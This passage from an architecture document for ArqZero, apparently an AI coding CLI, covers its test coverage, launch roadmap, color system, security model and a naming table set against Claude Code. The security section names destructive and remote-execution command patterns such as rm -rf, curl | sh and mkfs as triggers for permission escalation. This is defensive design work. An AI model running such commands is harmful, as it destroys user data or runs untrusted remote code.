│   │   └── escalation.test.ts
│   ├── plugins/            Plugin system
│   │   ├── types.ts          PluginManifest interface
│   │   ├── index.ts          Barrel
│   │   ├── loader.ts         PluginLoader (scan directories, parse manifests)
│   │   ├── loader.test.ts
│   │   ├── manager.ts        PluginManager (enable/disable/reload)
│   │   └── manager.test.ts
│   ├── registry/           Capability system
│   │   ├── capabilities.ts   42 capability definitions
│   │   ├── capabilities.test.ts
│   │   ├── matcher.ts        Keyword matching with suffix stemming
│   │   ├── matcher.test.ts
│   │   ├── injector.ts       Render matched capabilities into system prompt
│   │   └── injector.test.ts
│   ├── session/            Session management
│   │   ├── session.ts        Session class (create, touch, metadata)
│   │   ├── session.test.ts
│   │   ├── history.ts        Message persistence (append, load, compaction)
│   │   ├── history.test.ts
│   │   ├── context.ts        ContextWindow (token tracking, compaction threshold)
│   │   └── context.test.ts
│   ├── skills/             Skill system
│   │   ├── parser.ts         Parse skill .md files
│   │   ├── parser.test.ts
│   │   ├── loader.ts         Load skills from directories
│   │   ├── loader.test.ts
│   │   ├── commands.ts       Skill command integration
│   │   └── commands.test.ts
│   ├── system/             System utilities
│   │   ├── machine-id.ts     Generate stable machine identifier
│   │   └── machine-id.test.ts
│   ├── tools/              Tool system
│   │   ├── types.ts          Tool, ToolResult, ToolContext, PermissionLevel
│   │   ├── registry.ts       ToolRegistry (register, lookup, definitions)
│   │   ├── registry.test.ts
│   │   ├── executor.ts       ToolExecutor (permission check + execute)
│   │   ├── executor.test.ts
│   │   ├── path-guard.ts     Path traversal protection
│   │   ├── path-guard.test.ts
│   │   ├── validate.ts       Zod-based input validation
│   │   ├── validate.test.ts
│   │   └── builtins/
│   │       ├── index.ts        Barrel (all 18 tools)
│   │       ├── read.ts         Read tool
│   │       ├── read.test.ts
│   │       ├── write.ts        Write tool
│   │       ├── write.test.ts
│   │       ├── edit.ts         Edit tool
│   │       ├── edit.test.ts
│   │       ├── multi-edit.ts   MultiEdit tool
│   │       ├── multi-edit.test.ts
│   │       ├── bash.ts         Bash tool
│   │       ├── bash.test.ts
│   │       ├── bash-output.ts  BashOutput tool
│   │       ├── bash-output.test.ts
│   │       ├── kill-shell.ts   KillShell tool
│   │       ├── kill-shell.test.ts
│   │       ├── glob.ts         Glob tool
│   │       ├── glob.test.ts
│   │       ├── grep.ts         Grep tool
│   │       ├── ls.ts           LS tool
│   │       ├── ls.test.ts
│   │       ├── web-search.ts   WebSearch tool
│   │       ├── web-search.test.ts
│   │       ├── web-fetch.ts    WebFetch tool
│   │       ├── web-fetch.test.ts
│   │       ├── ask-user.ts     Prompt (AskUser) tool
│   │       ├── task.ts         Dispatch tool
│   │       ├── task.test.ts
│   │       ├── todo-write.ts   TodoWrite tool
│   │       ├── todo-read.ts    TodoRead tool
│   │       ├── todo-store.ts   Shared todo state
│   │       ├── todo.test.ts
│   │       ├── notebook-read.ts  NotebookRead tool
│   │       ├── notebook-edit.ts  NotebookEdit tool
│   │       └── notebook.test.ts
│   └── worktrees/          Git worktree management
│       ├── manager.ts        WorktreeManager (create, remove, list)
│       └── manager.test.ts
├── package.json
├── package-lock.json
├── tsconfig.json
└── .gitignore
```

### Test Coverage

| Module | Test Files | Description |
|---|---|---|
| agents/ | 3 | Loader, prompt builder, runner |
| api/ | 2 | Fireworks adapter, mock adapter |
| checkpoints/ | 2 | Store, rewind |
| cli/ | 10 | App, args, cron, diff-utils, headless, markdown, components (6) |
| commands/ | 2 | Registry, custom loader |
| config/ | 4 | Env, runtime, schema, settings |
| core/ | 3 | Engine, compaction, system prompt |
| hooks/ | 3 | Registry, command handler, HTTP handler |
| mcp/ | 1 | Bridge |
| memory/ | 2 | Store, injector |
| permissions/ | 2 | Manager, escalation |
| plugins/ | 2 | Loader, manager |
| registry/ | 3 | Capabilities, matcher, injector |
| session/ | 3 | Context, history, session |
| skills/ | 3 | Parser, loader, commands |
| system/ | 1 | Machine ID |
| tools/ | 4 | Registry, executor, path guard, validate |
| tools/builtins/ | 13 | Read, write, edit, multi-edit, bash, bash-output, kill-shell, glob, ls, web-search, web-fetch, task, todo, notebook |
| worktrees/ | 1 | Manager |
| **Total** | **68** | **698 tests** |

---

## 12. Roadmap

### Phase 1: Commercial Launch (4-6 weeks)

This is the current focus. Goal: paying customers.

| Task | Description | Status |
|---|---|---|
| Multi-provider config | Refactor config to support any OpenAI-compatible baseURL with named providers | Not started |
| License system | Key validation API on Cloudflare Worker/Railway, tier-based response | Not started |
| Feature gating | Tier checks distributed across tools, commands, capabilities, memory, plugins | Not started |
| Auth flow | `arqzero login` with email + 6-digit code, JWT + refresh tokens | Not started |
| Stripe integration | Checkout flow, subscription management, webhook handling | Not started |
| Website | Landing page, docs, pricing, blog at arqzero.dev | Not started |
| npm publish | Public package with clean README, `arqzero setup` wizard | Not started |
| Usage tracking | Client-side counter with server reconciliation | Not started |
| Polish | Bug fixes, TUI stability, error handling edge cases | Ongoing |

### Phase 2: Growth (2-3 months post-launch)

Goal: expand the addressable market.

| Task | Description |
|---|---|
| Native Anthropic adapter | Direct Claude API support (not just OpenAI-compatible). Captures Claude Code users who want to switch clients but keep their Anthropic API key. |
| VS Code extension | Sidebar panel that wraps ArqZero's ConversationEngine. Reuse the engine, tools, capabilities — replace the TUI with a VS Code webview. |
| Team features | Shared memory across team members, team-wide ARQZERO.md, usage dashboard per user. |
| Plugin marketplace | Community-contributed capabilities, tools, and agents. Hosted on arqzero.dev. |
| Model quality guide | Document recommended models per provider. Benchmark ArqZero's capabilities across different LLMs. |

### Phase 3: Platform (6+ months)

Goal: become a platform, not just a CLI.

| Task | Description |
|---|---|
| Web app | Browser-based ArqZero — like Claude.ai but for coding. Same engine, rendered in a web UI instead of the terminal. Useful for users who prefer browsers over terminals. |
| Android companion | Monitor running agents, approve permissions, review diffs from your phone. Not a full coding environment — a remote control for ArqZero sessions. |
| Enterprise | SSO (SAML/OIDC), audit logs, compliance certifications, on-premises deployment, dedicated support. |
| ArqZero API | ArqZero-as-a-Service for other tools to embed. Expose the capability pipeline, tool execution, and subagent dispatch as a REST API. |

### Future Scope

| Idea | Description |
|---|---|
| JetBrains extension | Plugin for IntelliJ, PyCharm, WebStorm — same engine, different UI. |
| Neovim integration | Native Neovim plugin using ArqZero's engine. |
| Web-based terminal | Full terminal emulator in the browser running ArqZero. No local installation needed. |
| Custom model fine-tuning | Fine-tune open models specifically for ArqZero's capability format. Improve methodology adherence for smaller models. |
| Capability marketplace | User-contributed capabilities beyond the built-in 42. Domain-specific methodologies for game dev, data science, DevOps. |

---

## 13. Color System

The color system is the single source of truth defined in `src/cli/theme.ts`. All colors must come from this system — no ad-hoc hex codes anywhere else.

### Brand Colors

| Name | Hex | Usage |
|---|---|---|
| `brand` | `#00D4AA` | Prompt symbol, one active state per screen. Maximum 2 uses per screen. |
| `brandDeep` | `#00A886` | Darker variant for hover/press states |
| `brandLight` | `#4EECD0` | Shimmer spinner peak color |
| `brandSubtle` | `#00D4AA18` | Background tint (8% opacity) |

### Semantic Colors

| Name | Hex | Usage |
|---|---|---|
| `success` | `#3AAF60` | Successful operations, tool completion dot |
| `error` | `#D04545` | Error states, failed operations |
| `warning` | `#C47F00` | Warnings, caution states |
| `info` | `#4A8FD4` | Informational highlights |

### Tool Colors

| Name | Hex | Usage |
|---|---|---|
| `toolFile` | `#4A7CF0` | File tools (Read, Write, Edit, Glob, Grep) — blue |
| `toolBash` | `#D42E8A` | Bash tool — magenta |

These are load-bearing cognitive signals. Developers learn to recognize blue = file operation, magenta = shell command at a glance. Do not change these without strong reason.

### Diff Colors

| Name | Hex | Usage |
|---|---|---|
| `diffLineAdd` | `#2E9E50` | Added line background |
| `diffWordAdd` | `#48BC66` | Added word highlight |
| `diffLineRemove` | `#B03A3A` | Removed line background |
| `diffWordRemove` | `#D05858` | Removed word highlight |

Desaturated compared to typical diff colors — optimized for extended reading sessions.

### Context Meter Colors

| Name | Hex | Usage |
|---|---|---|
| `ctxHealthy` | `#3AAF60` | 0-89% context usage |
| `ctxCaution` | `#C47F00` | 90-94% context usage |
| `ctxCritical` | `#C83030` | 95%+ context usage |
| `ctxTrack` | `#0d1520` | Meter background track |

### Chrome Colors

| Name | Hex | Usage |
|---|---|---|
| `bg` | `#1a1a1a` | Application background |
| `username` | `#6B7280` | Username display |
| `structural` | `#374151` | Borders, separators, structural lines |
| `badgeBg` | `#1f1f1f` | Badge/label backgrounds |

### Text Colors

| Name | Hex | Usage |
|---|---|---|
| `textPrimary` | `#D4D4D4` | Primary text (warm light grey) |
| `textSecondary` | `#6B7280` | Secondary text, descriptions |
| `textDim` | `#374151` | Tertiary text, timestamps |
| `textInvisible` | `#2a2a2a` | Nearly invisible text (structural alignment) |

Warm greys — not cold blue-greys. This is a deliberate choice for extended terminal sessions.

### Permission Colors

| Name | Hex | Usage |
|---|---|---|
| `permYes` | `#3AAF60` | [y]es option |
| `permAlways` | `#4A8FD4` | [a]lways option |
| `permNo` | `#D04545` | [n]o option |

### Symbols

| Name | Character | Code | Usage |
|---|---|---|---|
| `dot` | `●` (macOS: `⏺`) | U+25CF / U+23FA | Tool status indicator |
| `branch` | `⎿` | U+23BF | Indented output lines |
| `diamond` | `◆` | U+25C6 | App name, prompt prefix |
| `arrow` | `▸` | U+25B8 | Expandable items |
| `pipe` | `┊` | U+250A | Vertical connection |
| `prompt` | `›` | U+203A | Prompt suffix |
| `successDot` | `●` | U+25CF | Success indicator |
| `failureMark` | `×` | U+00D7 | Failure indicator |

### Usage Rules

1. **Brand color**: maximum 2 uses per screen — prompt symbol and one active state
2. **Tool colors**: never change these — they are cognitive anchors
3. **No ad-hoc colors**: every color must come from `COLORS` in theme.ts
4. **Diff colors**: desaturated by design for long reading — do not increase saturation
5. **Text hierarchy**: use `textPrimary` for main content, `textSecondary` for descriptions, `textDim` for timestamps/structural
6. **Background**: `#1a1a1a` is the only background color. Do not add secondary backgrounds.

---

## 14. Security Model

### Permission System

ArqZero has a three-level permission system:

| Level | Description | User Interaction |
|---|---|---|
| `safe` | Read-only operations that cannot modify state | Auto-allowed, no prompt |
| `ask` | Operations that modify files or run commands | User prompted for approval |
| `dangerous` | Potentially destructive operations | User prompted with extra warning |

Tools by permission level:

| Safe | Ask | Dangerous |
|---|---|---|
| Read, Glob, Grep, LS, BashOutput, TodoWrite, TodoRead, NotebookRead, WebSearch, WebFetch, Prompt | Write, Edit, MultiEdit, Bash, KillShell, NotebookEdit, Dispatch | Bash (escalated by pattern) |

### Permission Escalation

The Bash tool dynamically escalates from `ask` to `dangerous` when its command matches destructive patterns. There are 16 patterns covering:
- Recursive file deletion (`rm -rf`)
- Force git operations (`push --force`, `reset --hard`, `clean -f`)
- Database destruction (`DROP TABLE`, `TRUNCATE`, `DELETE FROM` without WHERE)
- Disk formatting (`mkfs`, `fdisk`, `dd`)
- Permission abuse (`chmod 777`)
- Remote code execution (`curl | sh`, `wget | sh`)
- System file modification (`> /etc/`)
- Package publication (`npm publish`)
- Auto-approval of unknown packages (`npx --yes`)

### Hardcoded Safety Rails

Four tools — Write, Edit, MultiEdit, Bash — have hardcoded permission requirements that **cannot be overridden by configuration**:
- They are not affected by `alwaysAllow` config
- They are not affected by `trust` mode
- They can only be auto-approved via session-level "always allow" (pressing `[a]`)
- In `locked` mode, they are denied without prompting

This ensures that even a misconfigured settings file cannot silently auto-approve file mutations.

### Path Traversal Protection

The `guardPath()` function prevents all file tools from accessing files outside three allowed zones:
1. Current working directory and its children
2. User's home directory and its children
3. System temp directory and its children

Any path that resolves outside these zones (via `..`, symlinks, or absolute paths) is blocked with an error.

### Input Validation

All tool inputs are validated using Zod schemas before execution. The `validateInput()` function:
- Parses the input against the schema
- Returns typed, validated data on success
- Throws a descriptive error on failure with field paths and messages

### ReDoS Prevention

The Grep tool accepts user-provided regex patterns. To prevent Regular Expression Denial of Service (ReDoS):
- File searches use `fast-glob` for file matching (no regex)
- Regex patterns are applied line-by-line (not against entire file contents)
- File size limits prevent processing of extremely large files

The Bash escalation patterns in `src/permissions/escalation.ts` are static (not user-provided) and have been reviewed for catastrophic backtracking.

### Session Security

- Session data is stored in `~/.arqzero/sessions/` with standard file permissions
- Auth tokens (for commercial version) will be stored in `~/.arqzero/auth.json` with 0600 permissions
- Refresh tokens are hashed before storage in the database (never stored in plaintext)
- JWT access tokens expire after 1 hour
- Machine ID binding prevents token reuse across devices

### No Telemetry, No Code Collection

ArqZero does not:
- Send telemetry data to any server
- Collect or transmit code from the user's projects
- Phone home on every request (license validation is once per day at most)
- Send the user's LLM API key to any ArqZero server

The user's LLM API key goes directly from their machine to their chosen LLM provider. ArqZero's backend (for the commercial version) only handles authentication, licensing, and usage counting — it never sees the user's code or LLM conversations.

---

## 15. Naming Conventions

ArqZero deliberately uses different names from Claude Code for many features. This establishes ArqZero as an independent product, not a clone.

### Full Mapping Table

| Concept | ArqZero | Claude Code |
|---|---|---|
| Project instructions file | `ARQZERO.md` | `CLAUDE.md` |
| Config directory | `~/.arqzero/` | `~/.claude/` |
| Generate project instructions | `/setup` | `/init` |
| Manual compaction | `/compress` | `/compact` |
| Installation health check | `/check` | `/doctor` |
| Set reasoning effort | `/think` | `/effort` |
| Rewind to checkpoint | `/undo` | `/rewind` |
| Subagent tool | `Dispatch` | `Task` |
| Ask user tool | `Prompt` | `AskUser` |
| Skip permission checks | `--auto-approve` | `--dangerously-skip-permissions` |
| Environment variable prefix | `ARQZERO_*` | `CLAUDE_*` |
| npm package name | `arqzero` | `@anthropic-ai/claude-code` |
| Binary command | `arqzero` | `claude` |
| TUI name | The Grid | (unnamed) |
| Brand color | `#00D4AA` (teal) | Blue/white |
| Prompt symbol | `◆ arq ›` | `>` |
| Default model | GLM-4.7 (Fireworks) | Claude Sonnet/Opus |
| Provider approach | BYOK (any OpenAI-compatible) | Claude only |
| Capability system | 42 structured capabilities | No equivalent |
| Verification gates | Mandatory completion checks | No equivalent |
| Spinner | Shimmer (per-character wave, 83 verbs) | Dots/standard |
| Permission memory | Session "always allow" via `[a]` | Similar |
| Custom commands | `.arqzero/commands/*.md` | `.claude/commands/*.md` |
| Custom agents | `~/.arqzero/agents/` | Agents via tool |
| Plugin system | `plugin.json` manifest | No plugin system |

### Naming Philosophy

ArqZero names are chosen to be:
1. **Shorter** where possible (`/check` vs `/doctor`, `/undo` vs `/rewind`)
2. **More descriptive** where clarity matters (`/compress` vs `/compact` — compaction is a specific technical term, compression is more intuitive)
3. **Action-oriented** (`Dispatch` implies sending agents out, `Task` is generic)
4. **Distinct** — a user should never confuse an ArqZero command for a Claude Code command

---

*This document covers the complete ArqZero system as of 2026-03-22. It is maintained in `C:\Users\prana\Projekts\Workshop\Arq-CODE\master.md`.*
